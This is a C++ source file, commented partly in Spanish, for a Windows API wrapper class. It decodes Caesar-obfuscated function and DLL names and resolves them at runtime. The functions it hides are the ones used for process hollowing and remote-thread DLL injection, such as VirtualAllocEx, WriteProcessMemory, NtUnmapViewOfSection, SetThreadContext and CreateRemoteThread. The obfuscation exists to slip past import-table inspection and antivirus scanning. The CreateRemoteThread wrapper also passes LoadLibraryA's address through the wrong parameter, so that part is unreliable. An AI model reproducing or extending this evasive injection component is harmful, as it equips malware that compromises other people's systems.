#include "system_utils\WinAPIWrapper.h"
#include <Obfuscator.h>

WinAPIWrapper::WinAPIWrapper() {
	std::vector<unsigned char> kernel32 = { 0x49, 0x43, 0x50, 0x4c, 0x43, 0x4a, 0x11, 0x10, 0xc, 0x42, 0x4a, 0x4a };
	std::vector<unsigned char> ntdll = { 0x4c, 0x52, 0x42, 0x4a, 0x4a, 0x0c, 0x42, 0x4a, 0x4a };

	hKernel32 = GetModuleHandleA(Obfuscator::decryptCaesar(kernel32, 0xDE).c_str());
	hNtdll = GetModuleHandleA(Obfuscator::decryptCaesar(ntdll, 0xDE).c_str());

	if (hKernel32 && hNtdll) {
		_LoadFunctions();
	}
}

WinAPIWrapper::~WinAPIWrapper() {
	if (hKernel32) FreeLibrary(hKernel32);
	if (hNtdll) FreeLibrary(hNtdll);
	//     loadedFunctions.clear();  // Limpia el mapa al finalizar
}

void WinAPIWrapper::_LoadFunctions() {

	// Nombres de las funciones cifradas
	std::vector<unsigned char> CreateProcessA		= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x1f };
	std::vector<unsigned char> WriteProcessMemory	= { 0x35, 0x50, 0x47, 0x52, 0x43, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
	std::vector<unsigned char> VirtualProtectEx		= { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x2e, 0x50, 0x4d, 0x52, 0x43, 0x41, 0x52, 0x23, 0x56 };
	std::vector<unsigned char> SetThreadContext		= { 0x31, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
	std::vector<unsigned char> ResumeThread			= { 0x30, 0x43, 0x51, 0x53, 0x4b, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
	std::vector<unsigned char> VirtualAllocEx		= { 0x34, 0x47, 0x50, 0x52, 0x53, 0x3f, 0x4a, 0x1f, 0x4a, 0x4a, 0x4d, 0x41, 0x23, 0x56 };
	std::vector<unsigned char> ReadProcessMemory	= { 0x30, 0x43, 0x3f, 0x42, 0x2e, 0x50, 0x4d, 0x41, 0x43, 0x51, 0x51, 0x2b, 0x43, 0x4b, 0x4d, 0x50, 0x57 };
	std::vector<unsigned char> NtUnmapViewOfSection = { 0x2c, 0x52, 0x33, 0x4c, 0x4b, 0x3f, 0x4e, 0x34, 0x47, 0x43, 0x55, 0x2d, 0x44, 0x31, 0x43, 0x41, 0x52, 0x47, 0x4d, 0x4c };
	std::vector<unsigned char> GetThreadContext		= { 0x25, 0x43, 0x52, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42, 0x21, 0x4d, 0x4c, 0x52, 0x43, 0x56, 0x52 };
	std::vector<unsigned char> CreateThread			= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };
	std::vector<unsigned char> LoadLibraryA			= { 0x2a, 0x4d, 0x3f, 0x42, 0x2a, 0x47, 0x40, 0x50, 0x3f, 0x50, 0x57, 0x1f };
	std::vector<unsigned char> CreateRemoteThread	= { 0x21, 0x50, 0x43, 0x3f, 0x52, 0x43, 0x30, 0x43, 0x4b, 0x4d, 0x52, 0x43, 0x32, 0x46, 0x50, 0x43, 0x3f, 0x42 };

	// Descifrado de nombres de funciones
	std::string CreateProcessA_str			= Obfuscator::decryptCaesar(CreateProcessA, 0xDE);
	std::string WriteProcessMemory_str		= Obfuscator::decryptCaesar(WriteProcessMemory, 0xDE);
	std::string VirtualProtectEx_str		= Obfuscator::decryptCaesar(VirtualProtectEx, 0xDE);
	std::string SetThreadContext_str		= Obfuscator::decryptCaesar(SetThreadContext, 0xDE);
	std::string ResumeThread_str			= Obfuscator::decryptCaesar(ResumeThread, 0xDE);
	std::string VirtualAllocEx_str			= Obfuscator::decryptCaesar(VirtualAllocEx, 0xDE);
	std::string ReadProcessMemory_str		= Obfuscator::decryptCaesar(ReadProcessMemory, 0xDE);
	std::string NtUnmapViewOfSection_str	= Obfuscator::decryptCaesar(NtUnmapViewOfSection, 0xDE);
	std::string GetThreadContext_str		= Obfuscator::decryptCaesar(GetThreadContext, 0xDE);
	std::string CreateThread_str			= Obfuscator::decryptCaesar(CreateThread, 0xDE);
	std::string LoadLibraryA_str			= Obfuscator::decryptCaesar(LoadLibraryA, 0xDE);
	std::string CreateRemoteThread_str		= Obfuscator::decryptCaesar(CreateRemoteThread, 0xDE);

    if (hKernel32) {
		// Obtener las direcciones de las funciones
        CreateProcessA_		= reinterpret_cast<pCreateProcessA>(GetProcAddress(hKernel32, CreateProcessA_str.c_str()));
        VirtualAllocEx_		= reinterpret_cast<pVirtualAllocEx>(GetProcAddress(hKernel32, VirtualAllocEx_str.c_str()));
        WriteProcessMemory_ = reinterpret_cast<pWriteProcessMemory>(GetProcAddress(hKernel32, WriteProcessMemory_str.c_str()));
        GetThreadContext_	= reinterpret_cast<pGetThreadContext>(GetProcAddress(hKernel32, GetThreadContext_str.c_str()));
		ReadProcessMemory_	= reinterpret_cast<pReadProcessMemory>(GetProcAddress(hKernel32, ReadProcessMemory_str.c_str()));
        SetThreadContext_	= reinterpret_cast<pSetThreadContext>(GetProcAddress(hKernel32, SetThreadContext_str.c_str()));
        ResumeThread_		= reinterpret_cast<pResumeThread>(GetProcAddress(hKernel32, ResumeThread_str.c_str()));
        CreateThread_		= reinterpret_cast<pCreateThread>(GetProcAddress(hKernel32, CreateThread_str.c_str()));
		LoadLibraryA_		= reinterpret_cast<pLoadLibraryA>(GetProcAddress(hKernel32, LoadLibraryA_str.c_str()));
		CreateRemoteThread_	= reinterpret_cast<pCreateRemoteThread>(GetProcAddress(hKernel32, CreateRemoteThread_str.c_str()));
    }

    if (hNtdll) {
        NtUnmapViewOfSection_ = reinterpret_cast<pNtUnmapViewOfSection>(GetProcAddress(hNtdll, NtUnmapViewOfSection_str.c_str()));
    }
}

BOOL WinAPIWrapper::CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags,
    LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation) {
    return CreateProcessA_ ? CreateProcessA_(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation) : FALSE;
}

LPVOID WinAPIWrapper::VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    return VirtualAllocEx_ ? VirtualAllocEx_(hProcess, lpAddress, dwSize, flAllocationType, flProtect) : nullptr;
}

BOOL WinAPIWrapper::WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    return WriteProcessMemory_ ? WriteProcessMemory_(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) : FALSE;
}

NTSTATUS WinAPIWrapper::NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    return NtUnmapViewOfSection_ ? NtUnmapViewOfSection_(ProcessHandle, BaseAddress) : STATUS_UNSUCCESSFUL;
}

BOOL WinAPIWrapper::GetThreadContext(HANDLE hThread, LPCONTEXT lpContext) {
    return GetThreadContext_ ? GetThreadContext_(hThread, lpContext) : FALSE;
}

BOOL WinAPIWrapper::ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
	return ReadProcessMemory_ ? ReadProcessMemory_(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead) : FALSE;
}

BOOL WinAPIWrapper::SetThreadContext(HANDLE hThread, const CONTEXT* lpContext) {
    return SetThreadContext_ ? SetThreadContext_(hThread, lpContext) : FALSE;
}

DWORD WinAPIWrapper::ResumeThread(HANDLE hThread) {
    return ResumeThread_ ? ResumeThread_(hThread) : -1;
}

HANDLE WinAPIWrapper::CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
	return CreateThread_ ? CreateThread_(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
}

HMODULE WinAPIWrapper::LoadLibraryA(LPCSTR lpLibFileName) {
	return LoadLibraryA_ ? LoadLibraryA_(lpLibFileName) : NULL;
}

HANDLE WinAPIWrapper::CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
	/*  In that function wrapper, lpThreadAttributes argument is optional.
	* LoadLibrary address is previously obtained by default in this class.
	*/

	if (lpThreadAttributes == NULL) {
		lpThreadAttributes = (LPSECURITY_ATTRIBUTES)LoadLibraryA_;
	}

	return CreateRemoteThread_ ? CreateRemoteThread_(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId) : NULL;
}
